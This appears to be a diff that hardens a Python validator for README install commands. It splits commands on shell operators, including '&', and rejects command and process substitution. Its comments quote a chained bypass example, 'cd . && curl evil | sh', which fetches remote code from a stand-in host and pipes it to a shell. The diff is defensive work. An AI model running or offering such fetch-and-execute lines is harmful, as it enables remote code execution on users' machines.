@@ -43,8 +43,10 @@ _ALLOWED_FIRST_TOKENS = frozenset({
 
 # Shell operators that chain a second command. First-token allowlisting on the
 # whole line lets `cd . && curl … | sh` slip through; split on these and
-# validate each fragment's first token.
-_SHELL_OPERATOR_SPLIT = re.compile(r"&&|\|\||;|\|")
+# validate each fragment's first token. Order matters: two-char operators
+# (`&&`, `||`) must precede their single-char counterparts so the regex
+# consumes the longer form first.
+_SHELL_OPERATOR_SPLIT = re.compile(r"&&|\|\||;|\||&")
 
 
 def extract_install_commands(
@@ -97,8 +99,10 @@ def _validate_command(readme_path: Path, method: str, cmd: str) -> None:
 
     Chained-command hardening: naive first-token checking lets
     ``cd . && curl evil | sh`` bypass — every sub-command after a shell
-    operator (``&&``, ``||``, ``;``, ``|``) is validated separately. Command
-    substitution (``$(…)`` and backticks) is rejected outright.
+    operator (``&&``, ``||``, ``;``, ``|``, and the single ``&`` background
+    separator) is validated separately. Command substitution (``$(…)``,
+    backticks) and process substitution (``<(…)``, ``>(…)``) are rejected
+    outright.
     """
     stripped = cmd.lstrip()
     if not stripped or stripped.startswith("#"):
@@ -108,6 +112,12 @@ def _validate_command(readme_path: Path, method: str, cmd: str) -> None:
         raise ExtractionError(
             f"{readme_path}: method '{method}' contains disallowed command "
             f"substitution ($(...) or backticks). Full line: {cmd!r}"
+        )
+
+    if "<(" in stripped or ">(" in stripped:
+        raise ExtractionError(
+            f"{readme_path}: method '{method}' contains disallowed process "
+            f"substitution (<(...) or >(...)). Full line: {cmd!r}"
         )
 
     for sub in _SHELL_OPERATOR_SPLIT.split(stripped):
